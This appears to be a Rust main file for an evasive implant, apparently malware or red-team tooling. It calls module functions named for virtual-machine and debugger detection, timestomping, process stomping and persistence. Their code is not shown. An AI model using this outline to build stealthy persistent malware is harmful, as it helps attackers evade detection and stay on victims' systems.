mod module;
use module::{check_vm, check_debugger, time_stomp, process_stomp, persistance};

fn main() {
   
    check_vm();
    check_debugger(); 
    time_stomp();
    process_stomp();
    persistance();

    std::thread::sleep(std::time::Duration::from_secs(10));
    std::process::exit(0);
}



